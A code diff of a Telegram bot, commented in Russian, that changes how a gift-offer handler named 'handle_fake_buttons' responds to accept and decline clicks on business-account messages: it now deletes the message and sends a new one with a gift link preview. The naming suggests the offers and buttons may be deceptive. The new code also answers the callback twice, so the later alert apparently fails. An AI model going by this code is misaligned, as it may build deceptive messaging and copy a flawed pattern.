@@ -113,7 +113,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- CACHE-BUSTER ДЛЯ МОБИЛЬНОГО TELEGRAM ---
+# --- УДАЛЕНИЕ И ОТПРАВКА (САМЫЙ СТАБИЛЬНЫЙ СПОСОБ) ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -126,6 +126,9 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     pretty_name = get_pretty_name(gift_slug)
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
+
+    # 1. Мгновенно убираем "часики" с кнопки, чтобы не бесило
+    await callback.answer()
 
     if action == "accept":
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
@@ -143,43 +146,34 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         new_keyboard = None
         alert_text = None
 
+    # 2. УДАЛЯЕМ СТАРОЕ СООБЩЕНИЕ
     try:
-        # ШАГ 1: Ломаем кэш мобильного клиента (ставим пустышку)
-        await bot.edit_message_text(
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id,
-            text="⏳",
-            reply_markup=None,
-            business_connection_id=business_connection_id,
-            link_preview_options=LinkPreviewOptions(is_disabled=True)
-        )
-        
-        # ШАГ 2: Ждем секунду, чтобы телефон "переварил" смену состояния
-        await asyncio.sleep(1.0)
-
-        # ШАГ 3: Отправляем финальный текст, кнопки и анимацию
-        await bot.edit_message_text(
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id,
-            text=new_text,
-            reply_markup=new_keyboard,
-            business_connection_id=business_connection_id,
-            parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
-        )
-
-        # ШАГ 4: Ждем еще полсекунды и показываем окно
-        await asyncio.sleep(0.5)
-        if alert_text:
-            await callback.answer(alert_text, show_alert=True)
+        if business_connection_id:
+            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
         else:
-            await callback.answer()
-
-    except TelegramBadRequest as e:
-        if "message is not modified" not in str(e).lower():
-            print(f"Ошибка изменения: {e}")
+            await callback.message.delete()
     except Exception as e:
-        print(f"Неизвестная ошибка: {e}")
+        print(f"Не удалось удалить: {e}")
+
+    # 3. ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ (с анимацией и кнопкой)
+    try:
+        kwargs = {
+            "chat_id": callback.message.chat.id,
+            "text": new_text,
+            "reply_markup": new_keyboard,
+            "parse_mode": "HTML",
+            "link_preview_options": LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
+        }
+        if business_connection_id: 
+            kwargs["business_connection_id"] = business_connection_id
+
+        await bot.send_message(**kwargs)
+    except Exception as e:
+        print(f"Ошибка отправки: {e}")
+
+    # 4. ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО
+    if alert_text:
+        await callback.answer(alert_text, show_alert=True)
 
 async def main():
     print("Бот запущен...")
